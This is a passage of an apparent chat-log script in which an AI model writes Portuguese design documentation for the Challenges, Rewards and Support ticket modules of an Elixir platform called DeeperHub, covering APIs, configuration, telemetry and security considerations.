        *   Publica evento `challenge.completed` no `Core.EventBus`.
        *   Para cada `reward_id` na definição do desafio, chama `DeeperHub.Rewards.grant_reward(user_id, reward_id, %{source_challenge_id: challenge_id})`.
        *   (Opcional) Chama `DeeperHub.Achievements.unlock_achievement_for_user(...)` se o desafio desbloquear uma conquista.
        *   Chama `DeeperHub.Notifications.send_notification(user_id, :challenge_completed, %{challenge_name: ..., rewards: ...})`.

## 📡 6. API (Funções Públicas da Fachada `DeeperHub.Challenges`)

### 6.1. Definições de Desafio (Admin)

*   **`DeeperHub.Challenges.create_challenge_definition(attrs :: map(), admin_user_id :: String.t()) :: {:ok, ChallengeDefinition.t()} | {:error, Ecto.Changeset.t()}`**
    *   `attrs`: `%{name: ..., description: ..., criteria: map(), start_date: DateTime.t() | nil, end_date: DateTime.t() | nil, reward_ids: list(String.t()), prerequisites: list(map())}`.
*   **`DeeperHub.Challenges.update_challenge_definition(def_id :: String.t(), attrs :: map(), admin_user_id :: String.t()) :: {:ok, ChallengeDefinition.t()} | {:error, Ecto.Changeset.t()}`**
*   **`DeeperHub.Challenges.list_challenge_definitions(filters :: map(), opts :: keyword()) :: {:ok, list(ChallengeDefinition.t()), Pagination.t()}`**
    *   `filters`: `:is_active_now`, `:type`.

### 6.2. Interações do Usuário

*   **`DeeperHub.Challenges.list_available_challenges_for_user(user_id :: String.t(), opts :: keyword()) :: {:ok, list(ChallengeView.t()), Pagination.t()}`**
    *   `ChallengeView.t()`: Combina definição com status/progresso do usuário.
    *   Mostra desafios ativos que o usuário pode participar (e não completou ou falhou, e atende pré-requisitos).
*   **`DeeperHub.Challenges.join_challenge(user_id :: String.t(), challenge_definition_id :: String.t()) :: {:ok, UserChallenge.t()} | {:error, :already_joined | :not_available | :prerequisites_not_met}`**
*   **`DeeperHub.Challenges.leave_challenge(user_id :: String.t(), challenge_definition_id :: String.t()) :: :ok | {:error, :not_joined}`** (Se aplicável)
*   **`DeeperHub.Challenges.get_user_challenge_status(user_id :: String.t(), challenge_definition_id :: String.t()) :: {:ok, UserChallenge.t() | %{status: :not_joined}}`**
    *   Retorna o `UserChallenge` com status e progresso.
*   **`DeeperHub.Challenges.list_user_challenges(user_id :: String.t(), filters :: map(), opts :: keyword()) :: {:ok, list(UserChallengeView.t()), Pagination.t()}`**
    *   `filters`: `:status` (`:in_progress`, `:completed`).

### 6.3. Processamento de Progresso (Chamado Internamente)

*   **`DeeperHub.Challenges.record_user_progress(user_id :: String.t(), challenge_definition_id :: String.t() | nil, event_type :: atom(), event_data :: map()) :: :ok`**
    *   Se `challenge_definition_id` for `nil`, o sistema tenta encontrar desafios relevantes para o `event_type`.

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager`:

*   **`[:challenges, :enabled]`** (Boolean): Habilita/desabilita o sistema de desafios. (Padrão: `true`)
*   **`[:challenges, :default_reward_points]`** (Integer): Pontos padrão se um desafio não especificar. (Padrão: `50`)
*   **`[:challenges, :notify_on_completion]`** (Boolean). (Padrão: `true`)
*   **`[:challenges, :notify_on_new_available]`** (Boolean).
*   **`[:challenges, :cache, :definition_ttl_seconds]`** (Integer).
*   **`[:challenges, :cache, :user_status_ttl_seconds]`** (Integer).
*   **`[:challenges, :worker, :status_update_interval_minutes]`** (Integer).

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.*`: Todos os módulos Core.
*   `DeeperHub.Accounts`: Para `user_id`.
*   `DeeperHub.Rewards`: Para conceder recompensas.
*   `DeeperHub.Achievements`: Desafios podem ser pré-requisitos ou conceder conquistas.
*   `DeeperHub.Notifications`: Para notificações.
*   `DeeperHub.Audit`: Para auditar gerenciamento de definições.

### 8.2. Bibliotecas Externas

*   `Ecto`.
*   Biblioteca CRON para `ChallengeStatusUpdateWorker` (se usar agendamento CRON).

## 🤝 9. Como Usar / Integração

*   **Administradores:** Criam e gerenciam `ChallengeDefinitions` via UI/Console.
*   **Módulos de Domínio:** Publicam eventos relevantes no `Core.EventBus`.
*   **`Challenges.EventListener`:** Consome esses eventos e chama `Challenges.record_user_progress` ou `ChallengesService` diretamente.
*   **UI do Usuário:**
    *   Mostra desafios disponíveis (`list_available_challenges_for_user`).
    *   Permite que usuários vejam seu progresso (`get_user_challenge_status`).
    *   Exibe desafios completados (`list_user_challenges` com filtro).

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar CRUD para `ChallengeDefinitionSchema`.
*   Testar a lógica do `CriterionEvaluator` para diferentes tipos de critérios (contagem, sequência, estado).
*   Testar os fluxos de participação, progresso e conclusão de desafios.
*   Testar a concessão correta de recompensas.
*   Testar a lógica de pré-requisitos.
*   Testar desafios temporizados (início, fim, expiração).
*   Localização: `test/deeper_hub/challenges/`.

### 10.2. Métricas

*   `deeper_hub.challenges.definition.created.count`
*   `deeper_hub.challenges.user.joined.count` (tags: `challenge_id`)
*   `deeper_hub.challenges.user.progress_updated.count` (tags: `challenge_id`)
*   `deeper_hub.challenges.user.completed.count` (tags: `challenge_id`, `user_segment`)
*   `deeper_hub.challenges.rewards_granted.count` (tags: `challenge_id`, `reward_type`)
*   `deeper_hub.challenges.active_challenges.gauge`

### 10.3. Logs

*   **Nível INFO:** Usuário juntou-se/completou desafio. Definição de desafio criada/atualizada.
*   **Nível DEBUG:** Evento processado pelo `EventListener` para progresso de desafio.
*   **Nível WARNING:** Critério de desafio malformado. Falha ao conceder uma recompensa.
*   **Nível ERROR:** Falha ao persistir estado do `UserChallenge`.

### 10.4. Telemetria

*   `[:deeper_hub, :challenges, :definition, :created | :updated | :deleted]`
    *   Metadados: `%{definition_id: id, admin_id: id}`
*   `[:deeper_hub, :challenges, :user_challenge, :status_changed]`
    *   Metadados: `%{user_id: id, challenge_id: id, old_status: atom, new_status: atom, progress: map}`
*   `[:deeper_hub, :challenges, :user_challenge, :completed]`
    *   Metadados: `%{user_id: id, challenge_id: id, rewards_granted: list}`
*   `[:deeper_hub, :challenges, :criterion_evaluation, :evaluated]`
    *   Metadados: `%{user_id: id, challenge_id: id, criteria_met: boolean}`

## ❌ 11. Tratamento de Erros

*   Falhas na avaliação de critérios ou na concessão de recompensas devem ser robustas, possivelmente com retentativas ou filas de DLQ para investigação.
*   Se um evento do sistema for perdido, o progresso do desafio pode não ser atualizado. Um worker de verificação periódica ou retroativa pode mitigar isso.

## 🛡️ 12. Considerações de Segurança

*   **Critérios de Desafio:** Garantir que os critérios não possam ser explorados ou facilmente \"farmados\" de maneiras não intencionais.
*   **Recompensas:** Se as recompensas tiverem valor real ou impacto no sistema, a lógica de concessão deve ser segura e auditável.
*   **Autorização:** Apenas administradores devem gerenciar definições de desafios.

## 🧑‍💻 13. Contribuição

*   Ao criar novos tipos de critérios no `CriterionEvaluator`, adicione testes abrangentes.
*   Garanta que os eventos do sistema necessários para rastrear o progresso dos desafios sejam publicados corretamente pelos módulos de origem.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar uma UI administrativa completa para gerenciamento de definições de desafios, incluindo uma DSL visual para critérios.
*   [ ] Adicionar desafios em equipe ou comunitários.
*   [ ] Permitir que desafios desbloqueiem outros desafios (cadeias de desafios).
*   [ ] \"Desafios Diários/Semanais\" gerados dinamicamente ou a partir de um pool.
*   [ ] Leaderboards para desafios competitivos.
*   [ ] Permitir que usuários compartilhem seu progresso ou conclusão de desafios.
*   [ ] Gamificar a própria criação de conteúdo (ex: \"Crie 3 servidores e ganhe um desafio bônus\").

---

*Última atualização: 2025-05-12*

---

Este módulo de Desafios adiciona uma camada interessante de engajamento!

O próximo poderia ser `DeeperHub.Rewards` para ver como as recompensas dos desafios (e conquistas) são gerenciadas, ou `DeeperHub.Support` para mudar um pouco o foco?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, vamos para o `DeeperHub.Rewards`! Este módulo é o complemento natural para `Achievements` e `Challenges`, lidando com a parte tangível (ou intangível) que os usuários recebem por suas realizações.

---

# Módulo: `DeeperHub.Rewards` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Rewards`

O módulo `DeeperHub.Rewards` é responsável por **definir, gerenciar e conceder recompensas** aos usuários do sistema DeeperHub. As recompensas são incentivos dados aos usuários por completarem desafios, desbloquearem conquistas, participarem de eventos, ou por outras ações valorizadas pela plataforma.

Este módulo lida com:
*   A criação e configuração dos diferentes tipos de recompensas disponíveis (ex: pontos, badges, itens virtuais, acesso a features, descontos).
*   A lógica de concessão de recompensas a um usuário.
*   O rastreamento de quais recompensas um usuário já recebeu ou possui.
*   (Opcional) A lógica para \"resgatar\" ou \"usar\" certas recompensas, se elas tiverem um efeito ativo.

O objetivo é fornecer um sistema flexível para incentivar e reconhecer o engajamento e as realizações dos usuários na plataforma DeeperHub. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Gerenciamento de Definições de Recompensas (`create_reward_definition/1`, etc.):**
    *   Permitir que administradores criem, visualizem, atualizem e excluam as definições das recompensas disponíveis.
    *   Cada definição inclui: nome, descrição, tipo de recompensa (ex: `:points`, `:badge`, `:virtual_item`, `:feature_unlock`, `:discount_coupon`), valor (ex: quantidade de pontos, ID do item virtual), ícone, metadados adicionais (ex: se é de uso único, se tem expiração).
*   **Concessão de Recompensas a Usuários (`grant_reward_to_user/3`):**
    *   Conceder uma recompensa específica (baseada em uma `RewardDefinition`) a um usuário.
    *   Registrar que o usuário recebeu a recompensa, incluindo a data e a origem (ex: qual desafio ou conquista a concedeu).
    *   Lidar com a lógica de recompensas de uso único ou de quantidade limitada.
*   **Consulta de Recompensas do Usuário:**
    *   Listar todas as recompensas que um usuário possui ou já recebeu (`list_user_rewards/1`).
    *   Verificar se um usuário possui uma recompensa específica (`user_has_reward?/2`).
*   **Resgate/Uso de Recompensas (Opcional, se aplicável):**
    *   Se algumas recompensas forem \"utilizáveis\" (ex: um cupom de desconto, um item que concede um bônus temporário), fornecer uma maneira de marcar a recompensa como usada.
*   **Integração com Outros Módulos:**
    *   Ser chamado por `DeeperHub.Achievements` e `DeeperHub.Challenges` para conceder recompensas automaticamente.
    *   Potencialmente, interagir com um sistema de inventário de itens virtuais ou um sistema de pontos/moeda.
*   **Observabilidade e Auditoria:**
    *   Logar e metrificar a concessão de recompensas.
    *   Publicar eventos de domínio (ex: `reward.granted`) no `Core.EventBus`.
    *   Auditar a criação/modificação de definições de recompensas.
*   **Caching:**
    *   Cachear definições de recompensas e, possivelmente, recompensas de usuários ativos.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Rewards` (Fachada Pública):**
    *   Ponto de entrada para todas as operações relacionadas a recompensas.
    *   Delega para o `RewardsService`.
2.  **`DeeperHub.Rewards.Services.RewardsService` (ou `DefaultRewardsService`):**
    *   **Responsabilidade:** Orquestra a lógica de negócio principal para o sistema de recompensas.
    *   **Interações:**
        *   `DeeperHub.Core.Repo`: Para CRUD com `RewardDefinitionSchema` e `UserRewardSchema`.
        *   `DeeperHub.Core.EventBus`: Para publicar eventos de concessão de recompensas.
        *   `DeeperHub.Core.Cache`: Para caching.
        *   `DeeperHub.Core.ConfigManager`: Para configurações.
        *   `DeeperHub.Notifications`: Para notificar usuários sobre recompensas recebidas.
        *   `DeeperHub.Audit`: Para auditar gerenciamento de definições.
        *   Potencialmente, interage com um `PointsService` ou `VirtualItemInventoryService` se esses forem sistemas separados.
3.  **Schemas Ecto:**
    *   **`DeeperHub.Rewards.Schemas.RewardDefinitionSchema` (ex-`Reward` na doc original):** Armazena os detalhes de cada tipo de recompensa disponível (nome, descrição, tipo, valor, ícone, metadados como `data_payload` para configurar o efeito da recompensa).
    *   **`DeeperHub.Rewards.Schemas.UserRewardSchema`:** Tabela de junção/log que registra qual usuário (`user_id`) recebeu qual recompensa (`reward_definition_id`), quando (`granted_at`), de qual fonte (`source_type`, `source_id`), e seu status atual (ex: `:granted`, `:claimed`, `:used`, `:expired`).
4.  **`DeeperHub.Rewards.Storage` (ou lógica dentro do `RewardsService`):**
    *   Encapsula as queries Ecto.
5.  **`DeeperHub.Rewards.RewardHandler` (Behaviour e Implementações, Nova Sugestão):**
    *   **Responsabilidade:** Se diferentes tipos de recompensa tiverem lógicas de \"aplicação\" complexas (ex: desbloquear uma feature, adicionar item ao inventário, aplicar desconto), um sistema de handlers por tipo de recompensa pode ser útil.
    *   Quando uma recompensa é concedida, o `RewardsService` poderia chamar o handler apropriado para aplicar o efeito da recompensa.
        *   Ex: `PointsRewardHandler`, `FeatureUnlockRewardHandler`.

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/rewards/
├── rewards.ex                        # Fachada Pública
│
├── services/
│   └── rewards_service.ex            # Serviço principal
│
├── schemas/                          # (Ou schema/)
│   ├── reward_definition_schema.ex
│   └── user_reward_schema.ex
│
├── storage.ex                        # (Opcional) Módulo de queries Ecto
│
├── handlers/                         # (Opcional, Nova Sugestão)
│   ├── reward_handler_behaviour.ex
│   ├── points_reward_handler.ex
│   └── feature_unlock_reward_handler.ex
│
├── cached_adapter.ex                 # (Opcional, da documentação original)
├── supervisor.ex
└── telemetry.ex
```

### 3.3. Decisões de Design Importantes

*   **Flexibilidade dos Tipos de Recompensa:** O campo `type` e `data_payload` (JSONB) na `RewardDefinitionSchema` permite grande flexibilidade para definir diferentes tipos de recompensas e seus parâmetros específicos.
*   **Idempotência na Concessão:** O sistema deve ser robusto a múltiplas tentativas de conceder a mesma recompensa a um usuário (ex: se um evento for processado duas vezes). A combinação de `user_id`, `reward_definition_id` e talvez `source_id` no `UserRewardSchema` pode ter um unique index.
*   **Separação da Lógica de Aplicação:** Se a \"aplicação\" de uma recompensa for complexa, usar `RewardHandler`s ajuda a manter o `RewardsService` focado na concessão e rastreamento.

## 🛠️ 4. Casos de Uso Principais

*   **Administrador Cria uma Recompensa \"100 Pontos de Bônus\":**
    *   Admin define: nome \"Bônus de 100 Pontos\", tipo `:points`, valor/payload `%{points: 100}`.
    *   API chama `Rewards.create_reward_definition(attrs)`.
*   **Usuário Completa um Desafio e Ganha \"100 Pontos de Bônus\":**
    *   `DeeperHub.Challenges` detecta a conclusão.
    *   Chama `Rewards.grant_reward_to_user(user_id, \"bonus_100_points_def_id\", %{source_type: :challenge, source_id: challenge_id})`.
*   **`RewardsService.grant_reward_to_user/3`:**
    *   Cria um registro `UserRewardSchema`.
    *   Publica evento `reward.granted`.
    *   Chama o `PointsRewardHandler` (se existir), que por sua vez chama um `DeeperHub.PointsService.add_points(user_id, 100)`.
    *   Notifica o usuário.
*   **Usuário Visualiza suas Recompensas Recebidas:**
    *   UI chama API que leva a `Rewards.list_user_rewards(user_id)`.

## 🌊 5. Fluxos Importantes

### Fluxo de Concessão de Recompensa

1.  **Fonte da Recompensa (ex: `ChallengesService`):** Determina que `user_id` deve receber `reward_definition_id` devido à `source_details` (ex: `%{type: :challenge, id: \"chall123\"}`).
2.  Chama `DeeperHub.Rewards.grant_reward_to_user(user_id, reward_definition_id, source_details)`.
3.  **`RewardsService.grant_reward_to_user/3`:**
    *   Verifica se o usuário já recebeu esta recompensa específica da mesma fonte (se a política for de concessão única por fonte).
    *   Busca a `RewardDefinitionSchema` para obter detalhes (tipo, valor/payload).
    *   Cria um registro `UserRewardSchema` com status `:granted`.
        *   `user_id: user_id`
        *   `reward_definition_id: reward_definition_id`
        *   `granted_at: DateTime.utc_now()`
        *   `source_type: source_details.type`
        *   `source_id: source_details.id`
        *   `data_payload_at_grant: reward_definition.data_payload` (para registrar o valor da recompensa no momento da concessão)
    *   Se a persistência do `UserReward` for bem-sucedida:
        *   **(Opcional) Chama o `RewardHandler` apropriado:**
            *   Ex: `MyApp.Rewards.Handlers.PointsHandler.apply(%{user_id: user_id, points: 100})`.
        *   Publica evento `reward.granted` no `Core.EventBus` (`%{user_id: ..., user_reward_id: ..., definition: ...}`).
        *   Enfileira notificação para o usuário via `DeeperHub.Notifications`.
        *   Retorna `{:ok, user_reward_struct}`.
    *   Se falhar, retorna erro.

## 📡 6. API (Funções Públicas da Fachada `DeeperHub.Rewards`)

### 6.1. Definições de Recompensa (Admin)

*   **`DeeperHub.Rewards.create_reward_definition(attrs :: map(), admin_user_id :: String.t()) :: {:ok, RewardDefinition.t()} | {:error, Ecto.Changeset.t()}`**
    *   `attrs`: `%{name: ..., description: ..., type: :points | :badge | :item | :feature_unlock, data_payload: map(), icon_url: ..., ...}`.
*   **`DeeperHub.Rewards.update_reward_definition(def_id :: String.t(), attrs :: map(), admin_user_id :: String.t()) :: {:ok, RewardDefinition.t()} | {:error, Ecto.Changeset.t()}`**
*   **`DeeperHub.Rewards.list_reward_definitions(filters :: map(), opts :: keyword()) :: {:ok, list(RewardDefinition.t()), Pagination.t()}`**

### 6.2. Concessão e Consulta de Usuário

*   **`DeeperHub.Rewards.grant_reward_to_user(user_id :: String.t(), reward_definition_id :: String.t(), source_context :: %{source_type: atom(), source_id: String.t() | integer()}, opts :: keyword()) :: {:ok, UserReward.t()} | {:error, :already_granted_for_source | term()}`**
    *   `opts`: `:granted_by_admin_id` (se for concessão manual).
*   **`DeeperHub.Rewards.list_user_rewards(user_id :: String.t(), opts :: keyword()) :: {:ok, list(UserRewardView.t()), Pagination.t()}`**
    *   `UserRewardView.t()`: Combina dados de `UserRewardSchema` e `RewardDefinitionSchema`.
    *   `opts`: `:status` (`:granted`, `:claimed`), `:page`, `:per_page`, `:sort_by`.
*   **`DeeperHub.Rewards.user_has_reward?(user_id :: String.t(), reward_definition_id :: String.t()) :: boolean()`**
*   **`DeeperHub.Rewards.claim_user_reward(user_reward_id :: String.t(), user_id :: String.t()) :: {:ok, UserReward.t()} | {:error, :not_claimable | :already_claimed | :not_found | :unauthorized}`** (Se houver recompensas que precisam ser ativamente \"reivindicadas\" antes de serem usadas/contabilizadas).

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager`:

*   **`[:rewards, :enabled]`** (Boolean): Habilita/desabilita o sistema de recompensas. (Padrão: `true`)
*   **`[:rewards, :default_point_reward_type_name]`** (String): Nome padrão para recompensas de pontos. (Padrão: `\"Points\"`)
*   **`[:rewards, :notify_on_grant]`** (Boolean): Se deve notificar usuários ao receberem recompensas. (Padrão: `true`)
*   **`[:rewards, :cache, :definition_ttl_seconds]`** (Integer).
*   **`[:rewards, :retention_days, :user_rewards_log]`** (Integer): Por quantos dias manter registros de `UserReward`.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.*`: Todos os módulos Core.
*   `DeeperHub.Accounts`: Para `user_id`.
*   `DeeperHub.Notifications`: Para notificar sobre recompensas.
*   `DeeperHub.Audit`: Para auditar gerenciamento de definições e concessões manuais.
*   `DeeperHub.Achievements`, `DeeperHub.Challenges`: Como fontes comuns para acionar a concessão de recompensas.
*   Potencialmente, um `DeeperHub.PointsService` ou `DeeperHub.InventoryService` para aplicar certos tipos de recompensa.

### 8.2. Bibliotecas Externas

*   `Ecto`.

## 🤝 9. Como Usar / Integração

*   **Módulos `Achievements` e `Challenges`:** Ao detectar que um usuário completou uma conquista ou desafio, eles chamam `DeeperHub.Rewards.grant_reward_to_user/3` para cada recompensa associada na definição da conquista/desafio.
*   **Interface de Administração:** Para gerenciar `RewardDefinitions`.
*   **Perfil do Usuário (UI):** Para exibir as recompensas que o usuário ganhou (`list_user_rewards/1`).

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar CRUD para `RewardDefinitionSchema`.
*   Testar a lógica de `grant_reward_to_user`, incluindo a criação de `UserRewardSchema` e a não duplicação (se aplicável).
*   Testar a integração com `RewardHandler`s (se implementados) para diferentes tipos de recompensa.
*   Testar as funções de listagem.
*   Localização: `test/deeper_hub/rewards/`.

### 10.2. Métricas

*   `deeper_hub.rewards.definition.created.count`
*   `deeper_hub.rewards.granted_to_user.count` (tags: `reward_definition_id`, `reward_type`, `source_type`)
*   `deeper_hub.rewards.claimed.count` (tags: `reward_definition_id`) (se houver resgate)
*   `deeper_hub.rewards.points_awarded.sum` (Contador)
*   `deeper_hub.rewards.items_granted.count` (tags: `item_type`)

### 10.3. Logs

*   **Nível INFO:** Recompensa concedida a um usuário. Definição de recompensa criada/atualizada.
*   **Nível WARNING:** Tentativa de conceder uma recompensa já concedida (e não repetível). Falha ao aplicar o efeito de uma recompensa (ex: erro ao adicionar pontos).
*   **Nível ERROR:** Falha ao persistir `UserReward`.

### 10.4. Telemetria

*   `[:deeper_hub, :rewards, :definition, :created | :updated | :deleted]`
    *   Metadados: `%{definition_id: id, type: type, admin_id: id}`
*   `[:deeper_hub, :rewards, :user_reward, :granted]`
    *   Metadados: `%{user_id: id, user_reward_id: id, reward_definition_id: id, source_type: type, source_id: id}`
*   `[:deeper_hub, :rewards, :reward_effect, :applied | :failed]` (Se usando Handlers)
    *   Metadados: `%{user_reward_id: id, handler_type: type, details: ...}`

## ❌ 11. Tratamento de Erros

*   Falhas na concessão de uma recompensa (ex: erro no DB) devem ser logadas e, idealmente, permitir uma retentativa ou correção manual.
*   Se a aplicação de um efeito de recompensa (ex: adicionar pontos) falhar, a concessão da recompensa em si (registro `UserReward`) ainda pode ser considerada bem-sucedida, mas o erro na aplicação do efeito deve ser tratado separadamente (ex: log, alerta, fila de retry para o efeito).

## 🛡️ 12. Considerações de Segurança

*   **Autorização:** A criação e modificação de `RewardDefinitions` deve ser restrita a administradores.
*   **Prevenção de Abuso:** Evitar que usuários possam acionar a concessão de recompensas indevidamente (ex: explorando os critérios de desafios/conquistas). A validação dos critérios deve ser robusta.
*   **Valor das Recompensas:** Se as recompensas tiverem valor monetário ou impacto significativo na economia do jogo/plataforma, a lógica de concessão e o rastreamento devem ser extremamente seguros e auditáveis.

## 🧑‍💻 13. Contribuição

*   Ao definir novas recompensas, pense no `type` e no `data_payload` de forma flexível.
*   Se um novo tipo de recompensa exigir lógica de aplicação customizada, considere criar um novo `RewardHandler`.
*   Garanta que a origem (`source_type`, `source_id`) da recompensa seja sempre registrada.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar um sistema de \"inventário de recompensas\" visual para o usuário, onde ele possa ver e, se aplicável, \"usar\" suas recompensas.
*   [ ] Adicionar datas de expiração para recompensas concedidas (ex: \"Cupom de 10% válido por 7 dias\").
*   [ ] Permitir que recompensas sejam \"presenteáveis\" entre usuários (com devidas restrições).
*   [ ] Sistema de \"reivindicação de recompensas\" onde o usuário precisa ativamente clicar para receber/ativar certas recompensas após serem concedidas.
*   [ ] Gamificar a própria obtenção de recompensas (ex: \"Colete 5 tipos diferentes de badges para uma recompensa bônus\").

---

*Última atualização: 2025-05-12*

---

Com `Rewards` detalhado, temos uma boa visão dos componentes de gamificação (`Achievements`, `Challenges`, `Rewards`).

Onde gostaria de ir agora? Podemos continuar com os \"ex-Serviços\" como `DeeperHub.Support` ou `DeeperHub.UserInteractions`, ou talvez um módulo Core como `DeeperHub.Core.CircuitBreaker` que já havíamos mencionado?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, já detalhamos o `DeeperHub.Core.CircuitBreaker`.

Vamos agora para o `DeeperHub.Support`, que lida com um aspecto crucial da experiência do usuário: o sistema de tickets de suporte.

---

# Módulo: `DeeperHub.Support` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Support`

O módulo `DeeperHub.Support` é responsável por gerenciar o **sistema de tickets de suporte** da plataforma DeeperHub. Ele permite que os usuários criem solicitações de suporte (tickets) para relatar problemas, fazer perguntas ou solicitar assistência. A equipe de suporte (ou administradores) pode então visualizar, gerenciar, responder e resolver esses tickets.

Este módulo abrange todo o ciclo de vida de um ticket, desde sua criação até a resolução, incluindo atribuição a agentes, comunicação entre usuário e suporte, e categorização. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Criação de Tickets (`create_ticket/1`):**
    *   Permitir que usuários autenticados (e, opcionalmente, visitantes não autenticados, se configurado) criem novos tickets de suporte.
    *   Capturar informações essenciais: assunto, descrição detalhada do problema/pergunta, categoria do problema, prioridade (definida pelo usuário ou sistema), informações do usuário (se logado).
    *   Permitir o anexo de arquivos (imagens, logs) aos tickets (integrando com um serviço de armazenamento de arquivos).
*   **Gerenciamento de Tickets (para Usuários e Suporte):**
    *   Listar tickets (`list_tickets/1`, `list_user_tickets/2`) com filtros (status, prioridade, categoria, atribuído a) e paginação.
    *   Visualizar detalhes de um ticket específico (`get_ticket/1`), incluindo todo o histórico de mensagens.
    *   Atualizar status de um ticket (ex: Aberto, Em Andamento, Aguardando Resposta do Usuário, Resolvido, Fechado) (`update_ticket_status/2`).
    *   Atribuir tickets a agentes de suporte específicos (se houver um sistema de agentes).
    *   Definir prioridade de tickets.
*   **Comunicação no Ticket:**
    *   Permitir que usuários e agentes de suporte adicionem mensagens/respostas a um ticket existente (`add_message_to_ticket/3` - Nova Sugestão).
    *   Manter um histórico cronológico de todas as comunicações dentro de um ticket.
*   **Categorização e Priorização:**
    *   Permitir a definição de categorias de tickets (ex: Problema Técnico, Dúvida de Cobrança, Sugestão).
    *   Permitir a definição de níveis de prioridade (ex: Baixa, Média, Alta, Urgente).
*   **Notificações (Integração com `DeeperHub.Notifications`):**
    *   Notificar o usuário quando um ticket é criado ou atualizado pela equipe de suporte.
    *   Notificar a equipe de suporte (ou agente atribuído) quando um novo ticket é criado ou um usuário responde a um ticket existente (via `NotificationIntegration`).
*   **Base de Conhecimento (FAQ) (Integração/Opcional):**
    *   Sugerir artigos relevantes da base de conhecimento enquanto o usuário cria um ticket para tentar resolver o problema autonomamente.
    *   Permitir que agentes de suporte criem ou vinculem artigos da base de conhecimento a partir de tickets.
*   **Escalação de Tickets:**
    *   Mecanismo para escalar tickets que não são resolvidos dentro de um SLA (Service Level Agreement) ou que requerem atenção especializada (`check_request_escalation/2` - pode ser parte da lógica de atualização de status).
*   **Relatórios e Estatísticas:**
    *   Fornecer dados sobre o volume de tickets, tempos de resposta, tempos de resolução, satisfação do cliente (se houver pesquisa pós-resolução), etc. (`count_tickets_by_status/0`).
*   **Limitação de Taxa (`RateLimitIntegration`):**
    *   Aplicar rate limiting na criação de tickets e adição de mensagens para prevenir abuso.
*   **Validação e Sanitização de Conteúdo:**
    *   Validar e sanitizar o conteúdo dos tickets e mensagens para prevenir XSS e outros problemas (via `DeeperHub.Services.Shared.ContentValidation`).
*   **Auditoria:**
    *   Registrar todas as ações importantes em um ticket (criação, mudança de status, atribuição, resposta) no `DeeperHub.Audit`.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Support` (Fachada Pública):**
    *   Ponto de entrada para todas as operações relacionadas a tickets de suporte.
    *   Delega para o `SupportService`.
2.  **`DeeperHub.Support.Services.SupportService` (ou `DefaultSupportService`):**
    *   **Responsabilidade:** Orquestra a lógica de negócio principal para o sistema de suporte.
    *   **Interações:**
        *   `DeeperHub.Core.Repo`: Para CRUD com `SupportTicketSchema` e `TicketMessageSchema`.
        *   `DeeperHub.Accounts`: Para informações do usuário.
        *   `DeeperHub.Auth`/`RBAC`: Para verificar permissões (ex: quem pode ver/responder/gerenciar tickets).
        *   `DeeperHub.Notifications`: Para enviar notificações sobre atualizações de tickets.
        *   `DeeperHub.Services.Shared.ContentValidation`: Para validar e sanitizar descrições e mensagens.
        *   `DeeperHub.Core.EventBus`: Para publicar eventos (ex: `ticket.created`, `ticket.message_added`).
        *   `DeeperHub.Core.ConfigManager`: Para configurações (categorias, prioridades padrão).
        *   `DeeperHub.Support.RateLimitIntegration`.
3.  **Schemas Ecto:**
    *   **`DeeperHub.Support.Schemas.SupportTicketSchema` (ex-`SupportTicket`):** Entidade principal do ticket (id, user_id, subject, description, status, priority, category, assigned_agent_id, created_at, updated_at, resolved_at, closed_at).
    *   **`DeeperHub.Support.Schemas.TicketMessageSchema` (Nova Sugestão):** Para armazenar as mensagens trocadas dentro de um ticket (ticket_id, user_id/agent_id, content, created_at, attachments).
    *   **`DeeperHub.Support.Schemas.TicketCategorySchema` (Nova Sugestão):** Definições de categorias de tickets.
    *   **`DeeperHub.Support.Schemas.TicketPrioritySchema` (Nova Sugestão):** Definições de prioridades.
4.  **`DeeperHub.Support.Storage` (ou lógica dentro do `SupportService`):**
    *   Encapsula as queries Ecto.
5.  **`DeeperHub.Support.NotificationIntegration`:**
    *   Lida especificamente com a lógica de quando e como enviar notificações relacionadas a tickets.
6.  **`DeeperHub.Support.RateLimitIntegration`:**
    *   Aplica políticas de rate limiting.
7.  **Workers (Opcional):**
    *   `TicketEscalationWorker`: Para verificar SLAs e escalar tickets.
    *   `TicketReminderWorker`: Para enviar lembretes sobre tickets aguardando resposta.
    *   `TicketAutoCloseWorker`: Para fechar automaticamente tickets resolvidos após um período de inatividade.

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/support/
├── support.ex                        # Fachada Pública
│
├── services/
│   └── support_service.ex            # Serviço principal
│
├── schemas/                          # (Ou schema/)
│   ├── support_ticket_schema.ex
│   ├── ticket_message_schema.ex
│   ├── ticket_category_schema.ex
│   └── ticket_priority_schema.ex
│
├── storage.ex                        # (Opcional) Módulo de queries Ecto
│
├── integrations/                     # Renomeado de NotificationIntegration para ser mais genérico
│   ├── notification_integration.ex
│   ├── audit_integration.ex          # Para logar no DeeperHub.Audit
│   └── event_integration.ex          # Para publicar no Core.EventBus
│
├── rate_limit_integration.ex
│
├── workers/                          # Opcional
│   ├── ticket_escalation_worker.ex
│   ├── ticket_reminder_worker.ex
│   └── ticket_auto_close_worker.ex
│
├── supervisor.ex
└── telemetry.ex
```
